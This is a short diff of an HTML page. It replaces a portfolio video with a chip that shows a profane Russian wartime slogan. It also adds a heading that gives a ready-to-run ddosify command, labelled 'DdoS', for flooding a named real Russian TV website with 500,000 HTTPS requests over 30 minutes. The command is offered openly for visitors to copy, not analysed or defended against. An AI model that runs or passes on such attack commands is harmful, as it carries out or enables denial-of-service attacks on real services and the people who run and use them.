@@ -18,10 +18,17 @@
 
 		<div class="container">
 			<div class="row">
-				<h3 class="center">Portfolio</h3>
-					<video class="responsive-video" controls>
-						<source width="853" height="480" src="video/1.mp4" type="video/mp4">
-					</video>
+
+				<div class="chip center">
+					Русский военный корабль, иди нахуй!
+					<i class="close material-icons">close</i>
+				</div>
+			</div>
+		</div><br>
+
+		<div class="container">
+			<div class="row">
+				<h5 class="center">DdoS: ddosify -t https://tvzvezda.ru -n 500000 -d 1800 -p HTTPS -m GET -l linear</h4>
 			</div>
 		</div>
 
